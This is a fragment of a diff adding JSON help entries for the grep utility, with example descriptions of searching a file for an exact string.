+        "title": "Grep",
+        "examples": [
+          {
+            "description": "From Grep",
+            "command": "Search for an exact string in file:"
+          },
+          {
+            "description": "From Grep",
+            "command": "Print lines in myfile.txt containing the string \"mellon\""
+          }
+        ]
+      }
+    }
+  }
+}
